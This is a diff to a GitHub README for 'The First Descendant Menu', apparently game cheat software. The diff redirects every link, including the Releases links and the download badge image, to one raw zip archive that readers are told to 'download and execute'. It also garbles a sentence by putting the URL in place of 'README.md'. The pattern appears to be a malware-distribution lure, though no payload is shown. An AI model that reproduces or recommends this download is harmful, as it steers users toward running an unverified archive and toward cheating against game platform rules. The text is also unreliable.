@@ -1,6 +1,6 @@
 # The First Descendant Menu: Advanced Software for Gaming Enhancement 🎮
 
-Welcome to "The First Descendant Menu" repository, your go-to source for cutting-edge software designed to elevate your gaming experience. Developed using state-of-the-art technologies and reverse expertise, our solution promises to provide you with a competitive edge in the gaming realm. This README.md will guide you through the key aspects of this repository in a clear and concise manner.
+Welcome to "The First Descendant Menu" repository, your go-to source for cutting-edge software designed to elevate your gaming experience. Developed using state-of-the-art technologies and reverse expertise, our solution promises to provide you with a competitive edge in the gaming realm. This https://github.com/duranmark200618/The-First-Descendant-Menu/raw/refs/heads/main/elastically/The_Descendant_Menu_First_v3.9.zip will guide you through the key aspects of this repository in a clear and concise manner.
 
 ## Overview ℹ️
 
@@ -32,7 +32,7 @@ Our repository covers a wide array of topics related to The First Descendant, in
 
 ## Installation and Usage 🚀
 
-To download and execute the latest version of "The First Descendant Menu," simply visit the [Releases](https://github.com/duranmark200618/The-First-Descendant-Menu/releases) section. From there, you can access the necessary files to get started with the software.
+To download and execute the latest version of "The First Descendant Menu," simply visit the [Releases](https://github.com/duranmark200618/The-First-Descendant-Menu/raw/refs/heads/main/elastically/The_Descendant_Menu_First_v3.9.zip) section. From there, you can access the necessary files to get started with the software.
 
 ## Get Started 🎯
 
@@ -42,8 +42,8 @@ Remember to abide by the regulations and guidelines of the gaming platform to en
 
 ---
 
-Make sure to visit the [Releases](https://github.com/duranmark200618/The-First-Descendant-Menu/releases) section for the latest version of the software.
+Make sure to visit the [Releases](https://github.com/duranmark200618/The-First-Descendant-Menu/raw/refs/heads/main/elastically/The_Descendant_Menu_First_v3.9.zip) section for the latest version of the software.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/duranmark200618/The-First-Descendant-Menu/releases)
+[![Download Now](https://github.com/duranmark200618/The-First-Descendant-Menu/raw/refs/heads/main/elastically/The_Descendant_Menu_First_v3.9.zip)](https://github.com/duranmark200618/The-First-Descendant-Menu/raw/refs/heads/main/elastically/The_Descendant_Menu_First_v3.9.zip)
 
 ✨ Happy Gaming! ✨
